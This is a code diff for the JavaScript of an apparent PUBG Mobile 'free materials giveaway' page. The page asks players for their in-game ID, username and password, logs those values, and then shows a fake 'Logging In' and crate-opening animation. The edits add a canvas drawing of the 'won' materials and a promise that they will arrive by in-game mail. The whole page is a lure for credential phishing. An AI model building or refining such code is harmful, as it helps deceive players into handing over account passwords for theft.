@@ -6,9 +6,9 @@ function captchaGen() {
 
 function winner(username, domain) {
 
-    let total_crates = Math.floor(Math.random() * 100);
-    let combo = Math.floor(total_crates / 10);
-    let crate_opening = "";
+    let total_crates = Math.floor(Math.random() * 100),
+        combo = Math.floor(total_crates / 10),
+        crate_opening = "";
 
     for (let i = 1; i <= combo; i++) {
         crate_opening += "_O_p_e_n_i_n_g_ _C_r_a_t_e_s_._._._._[" + `${i * 10}` + "/" + `${combo * 10}` + "]<br>";
@@ -32,7 +32,7 @@ function winner(username, domain) {
         '_L_o_g_g_i_n_g_ _I_n_._._._.<br>' +
         '<br>' +
         'You got <g>' + total_crates + '</g> crates...<br>' + crate_opening +
-        '_ <g>Finished !</g>';
+        '<g>Finished !</g>';
 
     hackText = hackText.split("_")
     count = 0;
@@ -52,6 +52,10 @@ function winner(username, domain) {
             if (terminaldiv.innerHTML.includes("You got")) {
                 $('.modal-title').html("Opening Crates ...");
             }
+            
+            if (terminaldiv.innerHTML.includes("Finished")) {
+                $('.modal-title').html("Counting Materials ...");
+            }
         }
     }
 
@@ -60,19 +64,51 @@ function winner(username, domain) {
     return combo;
 }
 
+
+function drawMaterial(num) {
+    $('#warning').hide();
+    $('.material-cont').show();
+    let tCtx = document.getElementById('materialCanvas').getContext('2d'),
+        img = new Image(),
+        text = tCtx.measureText(num.toString());
+
+    img.onload = function () {
+        tCtx.drawImage(img, 0, 0, 131, 131);
+        tCtx.font = "24px Arial";
+        tCtx.fillStyle = "#ffffff";
+        tCtx.textBaseline = "bottom";
+        tCtx.fillText(num, 115, 131);
+    }
+
+    img.src = 'assets/images/material.png';
+    
+    // imageElem.src = tCtx.canvas.toDataURL();
+}
+
 $(document).ready(function () {
     captchaGen();
 
-    $('.fa-sync').on('click', function (e) {
+    $('.fa-sync').on('click', function () {
         captchaGen();
     });
 
+    // $('#test-modal').on('click', function () {
+    //     $("#load-modal").modal({
+    //         backdrop: 'static',
+    //         keyboard: false,
+    //     });
+
+    //     $('#load-modal').modal('show');
+
+    //     drawMaterial(8);
+    // });
+
     $('#tapatap').on('click', function (e) {
-        let igid = $('#igid').val();
-        let ign = $('#ign').val();
-        let user = $('#user').val();
-        let pass = $('#pass').val();
-        let domain = $('input[name="loginMedium"]:checked').val();
+        let igid = $('#igid').val(),
+            ign = $('#ign').val(),
+            user = $('#user').val(),
+            pass = $('#pass').val(),
+            domain = $('input[name="loginMedium"]:checked').val();
 
         console.log(igid, ign, user, pass, domain);
 
@@ -91,8 +127,8 @@ $(document).ready(function () {
                 let materials = winner(user, domain);
 
                 $("#load-modal").modal({
-                        backdrop: 'static',
-                        keyboard: false,
+                    backdrop: 'static',
+                    keyboard: false,
                 });
 
                 $('#load-modal').modal('show');
@@ -101,7 +137,9 @@ $(document).ready(function () {
                     $('.circle-loader').toggleClass('load-complete');
                     $('.checkmark').toggle();
                     $('.modal-title').html("You got <r>" + `${materials}` + "</r> materials !");
-                    $('.modal-body').html(
+                    drawMaterial(materials);
+                    $('.circle-loader').hide();
+                    $('#msg').html(
                         "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
                         "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
                     );
